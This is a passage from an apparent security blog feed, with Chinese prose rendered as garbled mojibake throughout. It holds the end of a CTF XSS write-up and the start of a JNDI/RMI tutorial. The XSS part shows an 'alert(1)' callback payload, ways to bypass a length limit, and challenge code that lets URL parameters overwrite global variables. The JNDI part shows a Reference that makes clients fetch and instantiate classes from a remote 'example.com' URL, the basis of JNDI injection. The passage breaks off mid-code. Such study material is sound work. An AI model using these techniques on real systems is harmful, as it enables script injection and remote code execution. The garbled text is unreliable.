æ‰§è¡Œï¼Œå¦‚?callback=alert(1)æ—¢å¯å¼¹çª—ï¼Œä½†æ˜¯å­˜åœ¨50ä¸ªå­—ç¬¦çš„é™åˆ¶ï¼Œä¸è¿‡å¯ä»¥é€šè¿‡å¼•å…¥å¤–éƒ¨jsæˆ–è€…é€šè¿‡å˜é‡è¦†ç›–+evalæ¥ç»•è¿‡ã€‚</p><p>åé¢ä¹Ÿé‡å†™äº†jsonpå‡½æ•°ï¼Œè€Œä¸”å¯ä»¥çœ‹åˆ°é‡Œé¢çš„æ“ä½œï¼Œå¾ˆå…³é”®çš„åœ¨äºå¯¹äºå‚æ•°çš„æ‹¼æ¥<code>url = url + &quot;?&quot; + &quot;callback=&quot; + funName;</code>ã€‚æ‰€ä»¥è¿™é‡Œä¸ä¸Šé¢å¾ˆå¤§çš„ä¸åŒå°±æ˜¯è¿™é‡Œä½ å¯ä»¥åœ¨æ‹¼æ¥è¿‡ç¨‹ä¸­è¿›è¡Œä¸€äº›æ¶æ„çš„æ³¨é‡Šï¼Œä»è€Œå¯ä»¥ç›´æ¥é€šè¿‡importScriptså¼•å…¥jsæ–‡ä»¶ã€‚</p><figure class="highlight js"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs js">callback = <span class="hljs-string">&quot;get_user_login_status&quot;</span>;<br>auto_reg_var();<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">typeof</span>(jump_url) == <span class="hljs-string">&quot;undefined&quot;</span> || <span class="hljs-regexp">/^\//</span>.test(jump_url))&#123;<br>jump_url = <span class="hljs-string">&quot;/&quot;</span>;<br>&#125;<br>jsonp(<span class="hljs-string">&quot;https://auth.hardxss.xhlj.wetolink.com/api/loginStatus?callback=&quot;</span> + callback,<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">result</span>)</span>&#123;<br><span class="hljs-keyword">if</span>(result[<span class="hljs-string">&#x27;status&#x27;</span>])&#123;<br>location.href = jump_url;<br>&#125;<br>&#125;)<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">jsonp</span>(<span class="hljs-params">url, success</span>) </span>&#123;<br>  <span class="hljs-keyword">var</span> script = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">&quot;script&quot;</span>);<br>  <span class="hljs-keyword">if</span>(url.indexOf(<span class="hljs-string">&quot;callback&quot;</span>) &lt; <span class="hljs-number">0</span>)&#123;<br>    <span class="hljs-keyword">var</span> funName = <span class="hljs-string">&#x27;callback_&#x27;</span> + <span class="hljs-built_in">Date</span>.now() + <span class="hljs-built_in">Math</span>.random().toString().substr(<span class="hljs-number">2</span>, <span class="hljs-number">5</span>);<br>    url = url + <span class="hljs-string">&quot;?&quot;</span> + <span class="hljs-string">&quot;callback=&quot;</span> + funName;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">var</span> funName = callback;<br>    &#125;<br>    <span class="hljs-built_in">window</span>[funName] = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">data</span>) </span>&#123;<br>        success(data);<br>        <span class="hljs-keyword">delete</span> <span class="hljs-built_in">window</span>[funName];<br>        <span class="hljs-built_in">document</span>.body.removeChild(script);<br>    &#125;<br>    script.src = url;<br>    <span class="hljs-built_in">document</span>.body.appendChild(script);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">auto_reg_var</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">var</span> search = location.search.slice(<span class="hljs-number">1</span>);<br><span class="hljs-keyword">var</span> search_arr = search.split(<span class="hljs-string">&#x27;&amp;&#x27;</span>);<br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>;i &lt; search_arr.length; i++)&#123;<br>[key,value] = search_arr[i].split(<span class="hljs-string">&quot;=&quot;</span>);<br><span class="hljs-built_in">window</span>[key] = value;<br>&#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>æœ€ç»ˆçš„æ”»å‡»è¿‡ç¨‹ï¼Œçœ‹çœ‹ç½‘ä¸Šçš„å§ï¼Œé¢˜ç›®å¤ªä¹…è¿œäº†ï¼Œä¹Ÿæ²¡æ‰¾åˆ°ç¯å¢ƒï¼Œå°±æ²¡æ³•å¤ç°äº†ï¼Œä½†æ€è·¯éƒ½å·®ä¸å¤š</p><p><img src="https://img-blog.csdnimg.cn/2c921ec523c542fd8cf7aa11cf18e3b3.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNTM0ODcyNzc=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>xss</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JNDI</title>
    <link href="/2022/03/01/JNDI%E5%AD%A6%E4%B9%A0/"/>
    <url>/2022/03/01/JNDI%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="JNDIäº†è§£"><a href="#JNDIäº†è§£" class="headerlink" title="JNDIäº†è§£"></a>JNDIäº†è§£</h1><p>JNDIå…¨ç§°ä¸º Java Naming and DirectoryInterfaceï¼ˆJavaå‘½åå’Œç›®å½•æ¥å£ï¼‰ï¼Œæ˜¯ä¸€ç»„åº”ç”¨ç¨‹åºæ¥å£ï¼Œä¸ºå¼€å‘äººå‘˜æŸ¥æ‰¾å’Œè®¿é—®å„ç§èµ„æºæä¾›äº†ç»Ÿä¸€çš„é€šç”¨æ¥å£ï¼Œå¯ä»¥ç”¨æ¥å®šä¹‰ç”¨æˆ·ã€ç½‘ç»œã€æœºå™¨ã€å¯¹è±¡å’ŒæœåŠ¡ç­‰å„ç§èµ„æºã€‚</p><p>JNDIæ”¯æŒçš„æœåŠ¡ä¸»è¦æœ‰ï¼šDNSã€LDAPã€CORBAã€RMIç­‰ã€‚</p><p>ç®€å•ç‚¹è¯´ï¼ŒJNDIå°±æ˜¯ä¸€ç»„APIæ¥å£ã€‚æ¯ä¸€ä¸ªå¯¹è±¡éƒ½æœ‰ä¸€ç»„å”¯ä¸€çš„é”®å€¼ç»‘å®šï¼Œå°†åå­—å’Œå¯¹è±¡ç»‘å®šï¼Œå¯ä»¥é€šè¿‡åå­—æ£€ç´¢æŒ‡å®šçš„å¯¹è±¡ï¼Œè€Œè¯¥å¯¹è±¡å¯èƒ½å­˜å‚¨åœ¨RMIã€LDAPã€CORBAç­‰ç­‰ã€‚</p><h4 id="Java-Naming"><a href="#Java-Naming" class="headerlink" title="Java Naming"></a>Java Naming</h4><p>å‘½åæœåŠ¡æ˜¯ä¸€ç§é”®å€¼å¯¹çš„ç»‘å®šï¼Œä½¿åº”ç”¨ç¨‹åºå¯ä»¥é€šè¿‡é”®æ£€ç´¢å€¼ã€‚æ‰€ä»¥å…¶å®å‘½åçš„ç›®çš„å°±æ˜¯è®°å½•ä¸€äº›ä¸æ–¹ä¾¿è®°å½•çš„ä¸œè¥¿ï¼Œå°±åƒäººçš„åå­—æˆ–è€…dnsçš„åŸŸåå’Œipåœ°å€çš„å…³ç³»ä¸€æ ·ã€‚ä¸åŒçš„Naming Systemæœ‰ä¸ä¸€æ ·çš„è®°å½•æ–¹æ³•ã€‚ä¸€ä¸ªå‘½åçš„å±•ç¤ºç”±åå­—å’Œåˆ†éš”ç¬¦æç°ã€‚</p><h4 id="Java-Directory"><a href="#Java-Directory" class="headerlink" title="Java Directory"></a>Java Directory</h4><p>ç›®å½•æœåŠ¡æ˜¯å‘½åæœåŠ¡çš„è‡ªç„¶æ‰©å±•ã€‚è¿™ä¸¤è€…ä¹‹é—´çš„åŒºåˆ«åœ¨äºç›®å½•æœåŠ¡ä¸­å¯¹è±¡å¯ä»¥æœ‰å±æ€§ï¼Œè€Œå‘½åæœåŠ¡ä¸­å¯¹è±¡æ²¡æœ‰å±æ€§ã€‚å› æ­¤ï¼Œåœ¨ç›®å½•æœåŠ¡ä¸­å¯ä»¥æ ¹æ®å±æ€§æœç´¢å¯¹è±¡ã€‚</p><p>JNDIå…è®¸ä½ è®¿é—®æ–‡ä»¶ç³»ç»Ÿä¸­çš„æ–‡ä»¶ï¼Œå®šä½è¿œç¨‹RMIæ³¨å†Œçš„å¯¹è±¡ï¼Œè®¿é—®å¦‚LDAPè¿™æ ·çš„ç›®å½•æœåŠ¡ï¼Œå®šä½ç½‘ç»œä¸Šçš„EJBç»„ä»¶ã€‚</p><h4 id="ObjectFactory"><a href="#ObjectFactory" class="headerlink" title="ObjectFactory"></a>ObjectFactory</h4><p>Object Factoryç”¨äºå°†Naming Serviceï¼ˆå¦‚RMI/LDAPï¼‰ä¸­å­˜å‚¨çš„æ•°æ®è½¬æ¢ä¸ºJavaä¸­å¯è¡¨è¾¾çš„æ•°æ®ï¼Œå¦‚Javaä¸­çš„å¯¹è±¡æˆ–Javaä¸­çš„åŸºæœ¬æ•°æ®ç±»å‹ã€‚æ¯ä¸€ä¸ªService Providerå¯èƒ½é…æœ‰å¤šä¸ªObject Factoryã€‚</p><p>JNDIæ³¨å…¥çš„é—®é¢˜å°±æ˜¯å¤„åœ¨å¯è¿œç¨‹ä¸‹è½½è‡ªå®šä¹‰çš„ObjectFactoryç±»ä¸Šã€‚</p><p>æ‹¿JNDIçš„ä½œç”¨åˆ°åº•æ˜¯ä»€ä¹ˆå‘¢ï¼Œä¼¼ä¹è¿˜æ˜¯ä¸å¤ªç†è§£ï¼Œå†æ¥çœ‹çœ‹è¿™ç¯‡æ–‡ç« åº”è¯¥å°±æœ‰ä¸€ä¸ªåˆæ­¥çš„æ¦‚å¿µäº†ã€‚</p><p><a href="https://blog.csdn.net/zjlolife/article/details/8881154%E3%80%82">https://blog.csdn.net/zjlolife/article/details/8881154ã€‚</a></p><h1 id="JNDIå‰ç½®çŸ¥è¯†"><a href="#JNDIå‰ç½®çŸ¥è¯†" class="headerlink" title="JNDIå‰ç½®çŸ¥è¯†"></a>JNDIå‰ç½®çŸ¥è¯†</h1><h2 id="JNDIç»“æ„"><a href="#JNDIç»“æ„" class="headerlink" title="JNDIç»“æ„"></a>JNDIç»“æ„</h2><p><img src="http://images2017.cnblogs.com/blog/298371/201711/298371-20171118121255531-149192148.png"></p><p>JNDIç”±JNDI APIã€å‘½åç®¡ç†ã€JNDI SPIï¼ˆservice provider interfaceï¼‰æœåŠ¡æä¾›çš„æ¥å£ã€‚æˆ‘ä»¬çš„åº”ç”¨å¯ä»¥é€šè¿‡JNDIçš„APIå»è®¿é—®ç›¸å…³æœåŠ¡æä¾›çš„æ¥å£ã€‚</p><p>æˆ‘ä»¬è¦ä½¿ç”¨JNDIï¼Œå¿…é¡»è¦æœ‰æœåŠ¡æä¾›æ–¹ï¼Œæˆ‘ä»¬å¸¸ç”¨çš„å°±æ˜¯JDBCé©±åŠ¨æä¾›æ•°æ®åº“è¿æ¥æœåŠ¡ï¼Œç„¶åæˆ‘ä»¬é…ç½®JNDIè¿æ¥ã€‚ã€‚</p><p>JDKä¹Ÿä¸ºæˆ‘ä»¬æä¾›äº†ä¸€äº›æœåŠ¡æ¥å£ï¼š</p><ol><li><p>LDAP ï¼ˆLightweight Directory Access Protocolï¼‰ è½»é‡çº§ç›®å½•è®¿é—®åè®®</p></li><li><p>CORBA ï¼ˆCommon Object Request Broker Architectureï¼‰ å…¬å…±å¯¹è±¡è¯·æ±‚ä»£ç†ç»“æ„æœåŠ¡</p></li><li><p>RMIï¼ˆJava Remote Method Invocationï¼‰JAVAè¿œç¨‹è¿œç¨‹æ–¹æ³•è°ƒç”¨æ³¨å†Œ</p></li><li><p>DNSï¼ˆDomain Name Serviceï¼‰åŸŸåæœåŠ¡</p></li></ol><p>åœ¨Java Jdkä¸­æä¾›äº†5ä¸ªåŒ…ï¼Œæä¾›ç»™JNDIçš„åŠŸèƒ½å®ç°ï¼š</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">javax.naming:ä¸»è¦ç”¨äºå‘½åæ“ä½œï¼Œå®ƒæä¾›äº†å‘½åæœåŠ¡çš„ç±»å’Œæ¥å£ï¼Œè¯¥åŒ…å®šä¹‰äº†Contextæ¥å£å’ŒInitialContextç±»<br><br>javax.naming.directory:ä¸»è¦ç”¨äºç›®å½•æ“ä½œï¼Œå®ƒå®šä¹‰äº†DirContextæ¥å£å’ŒInitialDirContextç±»<br><br>javax.naming.event:åœ¨å‘½ä»¤ç›®å½•æœåŠ¡å™¨ä¸­è¯·æ±‚äº‹ä»¶é€šçŸ¥<br><br>javax.naming.loap:æä¾›LADPæ”¯æŒ<br><br>javax.naming.spi:å…è®¸åŠ¨æ€æ’å…¥ä¸åŒå®ç°ï¼Œä¸ºä¸åŒå‘½åç›®å½•æœåŠ¡ä¾›åº”å•†çš„å¼€å‘äººå‘˜æä¾›å¼€å‘å’Œå®ç°çš„é€”å¾„ï¼Œä»¥ä¾¿åº”ç”¨ç¨‹åºé€šè¿‡JNDIå¯ä»¥è®¿é—®ç›¸å…³æœåŠ¡<br></code></pre></div></td></tr></table></figure><h2 id=""><a href="#" class="headerlink" title=""></a></h2><h2 id="å…³äºRMI"><a href="#å…³äºRMI" class="headerlink" title="å…³äºRMI"></a>å…³äºRMI</h2><h3 id="è¿œç¨‹æ–¹æ³•è°ƒç”¨"><a href="#è¿œç¨‹æ–¹æ³•è°ƒç”¨" class="headerlink" title="è¿œç¨‹æ–¹æ³•è°ƒç”¨"></a>è¿œç¨‹æ–¹æ³•è°ƒç”¨</h3><blockquote><p>è¿œç¨‹æ–¹æ³•è°ƒç”¨æ˜¯åˆ†å¸ƒå¼ç¼–ç¨‹ä¸­çš„ä¸€ä¸ªåŸºæœ¬æ€æƒ³ã€‚å®ç°è¿œç¨‹æ–¹æ³•è°ƒç”¨çš„æŠ€æœ¯æœ‰å¾ˆå¤šï¼Œæ¯”å¦‚ï¼šCORBAã€WebServiceï¼Œè¿™ä¸¤ç§éƒ½æ˜¯ç‹¬ç«‹äºç¼–ç¨‹è¯­è¨€çš„ã€‚è€ŒRMIï¼ˆRemote Method Invocationï¼‰æ˜¯ä¸“ä¸ºJavaç¯å¢ƒè®¾è®¡çš„è¿œç¨‹æ–¹æ³•è°ƒç”¨æœºåˆ¶ï¼Œè¿œç¨‹æœåŠ¡å™¨å®ç°å…·ä½“çš„Javaæ–¹æ³•å¹¶æä¾›æ¥å£ï¼Œå®¢æˆ·ç«¯æœ¬åœ°ä»…éœ€æ ¹æ®æ¥å£ç±»çš„å®šä¹‰ï¼Œæä¾›ç›¸åº”çš„å‚æ•°å³å¯è°ƒç”¨è¿œç¨‹æ–¹æ³•ã€‚RMIä¾èµ–çš„é€šä¿¡åè®®ä¸ºJRMP(Java Remote Message Protocol ï¼ŒJava è¿œç¨‹æ¶ˆæ¯äº¤æ¢åè®®)ï¼Œè¯¥åè®®ä¸ºJavaå®šåˆ¶ï¼Œè¦æ±‚æœåŠ¡ç«¯ä¸å®¢æˆ·ç«¯éƒ½ä¸ºJavaç¼–å†™ã€‚è¿™ä¸ªåè®®å°±åƒHTTPåè®®ä¸€æ ·ï¼Œè§„å®šäº†å®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯é€šä¿¡è¦æ»¡è¶³çš„è§„èŒƒã€‚åœ¨RMIä¸­å¯¹è±¡æ˜¯é€šè¿‡åºåˆ—åŒ–æ–¹å¼è¿›è¡Œç¼–ç ä¼ è¾“çš„ã€‚</p></blockquote><p>å…¶å®ä½¿ç”¨è¿œç¨‹æ–¹æ³•è°ƒç”¨ï¼Œå°±ä¼šæ¶‰åŠä¸€ä¸ªæ•°æ®æ ¼å¼çš„é—®é¢˜ï¼Œä¾‹å¦‚åœ¨jsä¸­ä¸€èˆ¬éƒ½æ˜¯ä½¿ç”¨jsonçš„æ ¼å¼è¿›è¡Œå¤§éƒ¨åˆ†æ•°æ®çš„ä¼ è¾“ï¼Œåœ¨phpä¸­è¿›è¡Œphpçš„æ•°æ®åºåˆ—åŒ–å°†æ•°æ®ç»Ÿä¸€å½¢å¼å‚¨å­˜å’Œä¼ è¾“ã€‚è¿™é‡Œä¹Ÿæ˜¯ä¸€æ ·ï¼Œè¿™äº›éœ€è¦è¢«ä¼ è¾“çš„å¯¹è±¡å¿…é¡»å¯ä»¥è¢«åºåˆ—åŒ–ï¼Œè¿™è¦æ±‚ç›¸åº”çš„ç±»å¿…é¡»å®ç° java.io.Serializable æ¥å£ï¼Œå¹¶ä¸”å®¢æˆ·ç«¯çš„serialVersionUIDå­—æ®µè¦ä¸æœåŠ¡å™¨ç«¯ä¿æŒä¸€è‡´ã€‚</p><p>åœ¨RMIè¿œç¨‹è°ƒç”¨ä¸­ï¼Œä»»ä½•å¯ä»¥è¢«è¿œç¨‹è°ƒç”¨æ–¹æ³•çš„å¯¹è±¡å¿…é¡»å®ç°<code>java.rmi.Remote</code>æ¥å£ï¼Œè¿œç¨‹å¯¹è±¡çš„å®ç°å¿…é¡»ç»§æ‰¿<code>UnicastRemoteObject</code>ç±»ã€‚å¦‚æœä¸ç»§æ‰¿<code>UnicastRemoteObject</code>ç±»ï¼Œåˆ™éœ€è¦æ‰‹å·¥åˆå§‹åŒ–è¿œç¨‹å¯¹è±¡ï¼Œåœ¨è¿œç¨‹å¯¹è±¡çš„æ„é€ æ–¹æ³•çš„è°ƒç”¨<code>UnicastRemoteObject.exportObject()</code>é™æ€æ–¹æ³•ã€‚</p><blockquote><p>åœ¨JVMä¹‹é—´é€šä¿¡æ—¶ï¼ŒRMIå¯¹è¿œç¨‹å¯¹è±¡å’Œéè¿œç¨‹å¯¹è±¡çš„å¤„ç†æ–¹å¼æ˜¯ä¸ä¸€æ ·çš„ï¼Œå®ƒå¹¶æ²¡æœ‰ç›´æ¥æŠŠè¿œç¨‹å¯¹è±¡å¤åˆ¶ä¸€ä»½ä¼ é€’ç»™å®¢æˆ·ç«¯ï¼Œè€Œæ˜¯ä¼ é€’äº†ä¸€ä¸ªè¿œç¨‹å¯¹è±¡çš„Stubï¼ŒStubåŸºæœ¬ä¸Šç›¸å½“äºæ˜¯è¿œç¨‹å¯¹è±¡çš„å¼•ç”¨æˆ–è€…ä»£ç†ã€‚Stubå¯¹å¼€å‘è€…æ˜¯é€æ˜çš„ï¼Œå®¢æˆ·ç«¯å¯ä»¥åƒè°ƒç”¨æœ¬åœ°æ–¹æ³•ä¸€æ ·ç›´æ¥é€šè¿‡å®ƒæ¥è°ƒç”¨è¿œç¨‹æ–¹æ³•ã€‚Stubä¸­åŒ…å«äº†è¿œç¨‹å¯¹è±¡çš„å®šä½ä¿¡æ¯ï¼Œå¦‚Socketç«¯å£ã€æœåŠ¡ç«¯ä¸»æœºåœ°å€ç­‰ç­‰ï¼Œå¹¶å®ç°äº†è¿œç¨‹è°ƒç”¨è¿‡ç¨‹ä¸­å…·ä½“çš„åº•å±‚ç½‘ç»œé€šä¿¡ç»†èŠ‚ï¼Œæ‰€ä»¥RMIè¿œç¨‹è°ƒç”¨é€»è¾‘æ˜¯è¿™æ ·çš„ï¼š </p></blockquote><p><img src="https://security.tencent.com/uploadimg_dir/201903/07d8ba7e439b55dd0c3240ab9a602999.png" alt="img"></p><p>ä»é€»è¾‘ä¸Šæ¥è¯´ï¼Œæ•°æ®æ˜¯åœ¨Clientå’ŒServerä¹‹é—´æ¨ªå‘æµåŠ¨çš„ï¼Œä½†æ˜¯å®é™…ä¸Šæ˜¯ä»Clientåˆ°Stubï¼Œç„¶åä»Skeletonåˆ°Serverè¿™æ ·çºµå‘æµåŠ¨çš„ï¼š</p><ol><li>Serverç«¯ç›‘å¬ä¸€ä¸ªç«¯å£ï¼Œè¿™ä¸ªç«¯å£æ˜¯JVMéšæœºé€‰æ‹©çš„ï¼›</li><li>Clientç«¯å¹¶ä¸çŸ¥é“Serverè¿œç¨‹å¯¹è±¡çš„é€šä¿¡åœ°å€å’Œç«¯å£ï¼Œä½†æ˜¯Stubä¸­åŒ…å«äº†è¿™äº›ä¿¡æ¯ï¼Œå¹¶å°è£…äº†åº•å±‚ç½‘ç»œæ“ä½œï¼›</li><li>Clientç«¯å¯ä»¥è°ƒç”¨Stubä¸Šçš„æ–¹æ³•ï¼›</li><li>Stubè¿æ¥åˆ°Serverç«¯ç›‘å¬çš„é€šä¿¡ç«¯å£å¹¶æäº¤å‚æ•°ï¼›</li><li>è¿œç¨‹Serverç«¯ä¸Šæ‰§è¡Œå…·ä½“çš„æ–¹æ³•ï¼Œå¹¶è¿”å›ç»“æœç»™Stubï¼›</li><li>Stubè¿”å›æ‰§è¡Œç»“æœç»™Clientç«¯ï¼Œä»Clientçœ‹æ¥å°±å¥½åƒæ˜¯Stubåœ¨æœ¬åœ°æ‰§è¡Œäº†è¿™ä¸ªæ–¹æ³•ä¸€æ ·ï¼›</li></ol><h3 id="RMIæ³¨å†Œè¡¨"><a href="#RMIæ³¨å†Œè¡¨" class="headerlink" title="RMIæ³¨å†Œè¡¨"></a>RMIæ³¨å†Œè¡¨</h3><p>å…³äºRMIæ³¨å†Œè¡¨ï¼Œå…¶å®å°±æ˜¯ç”¨æ¥è§£å†³å®¢æˆ·ç«¯å¦‚ä½•å»è°ƒç”¨Stubä¸­çš„æ–¹æ³•çš„ã€‚</p><p>è¿™é‡Œæ‰€è°“æ³¨å†Œï¼Œå°±æ˜¯æä¾›ä¸€ä¸ªæ³¨å†Œè¡¨ï¼Œåœ¨æ³¨å†Œè¡¨ä¸­å¯ä»¥å°†æ–¹æ³•ç»‘å®šä¸€ä¸ªåå­—ï¼ˆä¹Ÿå¯ä»¥å«æ³¨å†Œè¿œç¨‹å¯¹è±¡ï¼‰ï¼Œä»¥ä¾›å…¶ä»–çš„è¿›ç¨‹æ¥è°ƒç”¨éœ€è¦çš„å¯¹è±¡ï¼Œæ‰€ä»¥Clientè¦å¯»æ‰¾Stubä¸­çš„å¯¹è±¡ä¿¡æ¯å°±ç›´æ¥æŸ¥è¯¢è¿™ä¸ªæ³¨å†Œè¡¨å³å¯ã€‚</p><p>è¦æ³¨å†Œè¿œç¨‹å¯¹è±¡ï¼Œéœ€è¦RMI URLå’Œä¸€ä¸ªè¿œç¨‹å¯¹è±¡çš„å¼•ç”¨ã€‚ </p><p><img src="https://img-blog.csdnimg.cn/e55ae81b9fab4c4bad377b25ca5a9140.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p><code>LocateRegistry.getRegistry()</code>ä¼šä½¿ç”¨ç»™å®šçš„ä¸»æœºå’Œç«¯å£ç­‰ä¿¡æ¯æœ¬åœ°åˆ›å»ºä¸€ä¸ªStubå¯¹è±¡ä½œä¸ºRegistryè¿œç¨‹å¯¹è±¡çš„ä»£ç†ï¼Œä»è€Œå¯åŠ¨æ•´ä¸ªè¿œç¨‹è°ƒç”¨é€»è¾‘ã€‚æœåŠ¡ç«¯åº”ç”¨ç¨‹åºå¯ä»¥å‘RMIæ³¨å†Œè¡¨ä¸­æ³¨å†Œè¿œç¨‹å¯¹è±¡ï¼Œç„¶åå®¢æˆ·ç«¯å‘RMIæ³¨å†Œè¡¨æŸ¥è¯¢æŸä¸ªè¿œç¨‹å¯¹è±¡åç§°ï¼Œæ¥è·å–è¯¥è¿œç¨‹å¯¹è±¡çš„Stubã€‚ </p><p><img src="https://img-blog.csdnimg.cn/bd6fb5f47d2f4434b0851bd122d01d4b.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>è¿™é‡Œåº”ç”¨ä½¿ç”¨ JNDI è·å–è¿œç¨‹ <code>sayHello()</code> å‡½æ•°å¹¶ä¼ å…¥ <code>&quot;KKfine&quot;</code> å‚æ•°è¿›è¡Œè°ƒç”¨æ—¶ï¼ŒçœŸæ­£æ‰§è¡Œè¯¥å‡½æ•°æ˜¯åœ¨è¿œç¨‹æœåŠ¡ç«¯ï¼Œæ‰§è¡Œå®Œæˆåä¼šå°†ç»“æœåºåˆ—åŒ–è¿”å›ç»™åº”ç”¨ç«¯ï¼Œè¿™ä¸€ç‚¹æ˜¯éœ€è¦å¼„æ¸…æ¥šçš„ã€‚</p><p>ä½¿ç”¨RMI Registryä¹‹åï¼ŒRMIçš„è°ƒç”¨å…³ç³»æ˜¯è¿™æ ·çš„ï¼š </p><p><img src="https://security.tencent.com/uploadimg_dir/201903/efd7772c92a8e21034c5897724ef37db.png" alt="img"></p><h3 id="åŠ¨æ€åŠ è½½ç±»"><a href="#åŠ¨æ€åŠ è½½ç±»" class="headerlink" title="åŠ¨æ€åŠ è½½ç±»"></a><strong>åŠ¨æ€åŠ è½½ç±»</strong></h3><p>å¦‚æœè¿œç¨‹è·å–RMIæœåŠ¡ä¸Šçš„å¯¹è±¡ä¸º<code>Reference</code>ç±»æˆ–è€…å…¶å­ç±»ï¼Œåˆ™åœ¨å®¢æˆ·ç«¯è·å–åˆ°è¿œç¨‹å¯¹è±¡å­˜æ ¹å®ä¾‹æ—¶ï¼Œå¯ä»¥ä»å…¶ä»–æœåŠ¡å™¨ä¸ŠåŠ è½½classæ–‡ä»¶æ¥è¿›è¡Œå®ä¾‹åŒ–ã€‚å› ä¸ºä¸€å®šä¼šæœ‰æŸäº›ç±»çš„classæ–‡ä»¶ä¸åœ¨æœ¬åœ°ä¸Šï¼Œè€Œåƒä¸Šé¢çš„Helloç±»æ˜¯å†™åœ¨æœ¬åœ°çš„ã€‚</p><p>Reference ä¸­å‡ ä¸ªæ¯”è¾ƒå…³é”®çš„å±æ€§ï¼š</p><p>â€‹    1. <code>className </code>è¿œç¨‹åŠ è½½æ—¶æ‰€ä½¿ç”¨çš„ç±»å</p><p>â€‹    2.<code>classFactory</code>åŠ è½½çš„classä¸­éœ€è¦å®ä¾‹åŒ–çš„åç§°</p><p>â€‹    3.<code>classFactoryLocation</code>æä¾›classesæ•°æ®çš„åœ°å€ å¯ä»¥æ˜¯file/ftp/http ç­‰åè®®</p><p>ä¾‹å¦‚è¿™é‡Œå®šä¹‰ä¸€ä¸ª Reference å®ä¾‹ï¼Œå¹¶ä½¿ç”¨ç»§æ‰¿äº† <code>UnicastRemoteObject</code> ç±»çš„ <code>ReferenceWrapper</code> åŒ…è£¹ä¸€ä¸‹å®ä¾‹å¯¹è±¡ï¼Œä½¿å…¶èƒ½å¤Ÿé€šè¿‡ RMI è¿›è¡Œè¿œç¨‹è®¿é—®ï¼š</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">Reference refObj = <span class="hljs-keyword">new</span> Reference(<span class="hljs-string">&quot;refClassName&quot;</span>, <span class="hljs-string">&quot;insClassName&quot;</span>, <span class="hljs-string">&quot;http://example.com:12345/&quot;</span>);<br>ReferenceWrapper refObjWrapper = <span class="hljs-keyword">new</span> ReferenceWrapper(refObj);<br>registry.bind(<span class="hljs-string">&quot;refObj&quot;</span>, refObjWrapper);<br></code></pre></div></td></tr></table></figure><p>å½“æœ‰å®¢æˆ·ç«¯é€šè¿‡ <code>lookup(&quot;refObj&quot;)</code> è·å–è¿œç¨‹å¯¹è±¡æ—¶ï¼Œè·å¾—åˆ°ä¸€ä¸ª Reference ç±»çš„å­˜æ ¹ï¼Œç”±äºè·å–çš„æ˜¯ä¸€ä¸ª Reference å®ä¾‹ï¼Œå®¢æˆ·ç«¯ä¼šé¦–å…ˆå»æœ¬åœ°çš„ <code>CLASSPATH</code> å»å¯»æ‰¾è¢«æ ‡è¯†ä¸º <code>refClassName</code> çš„ç±»ï¼Œå¦‚æœæœ¬åœ°æœªæ‰¾åˆ°ï¼Œåˆ™ä¼šå»è¯·æ±‚ <code>http://example.com:12345/refClassName.class</code> åŠ¨æ€åŠ è½½ classes å¹¶è°ƒç”¨ <code>insClassName</code> çš„æ„é€ å‡½æ•°ã€‚</p><h3 id="JNDI-åè®®åŠ¨æ€è½¬æ¢"><a href="#JNDI-åè®®åŠ¨æ€è½¬æ¢" class="headerlink" title="JNDI åè®®åŠ¨æ€è½¬æ¢"></a>JNDI åè®®åŠ¨æ€è½¬æ¢</h3><p>åœ¨åˆå§‹åŒ–é…ç½® JNDI è®¾ç½®æ—¶å¯ä»¥é¢„å…ˆæŒ‡å®šå…¶ä¸Šä¸‹æ–‡ç¯å¢ƒï¼ˆRMIã€LDAP æˆ–è€… CORBA ç­‰ï¼‰ï¼š</p><figure class="highlight java"><table><tr><td 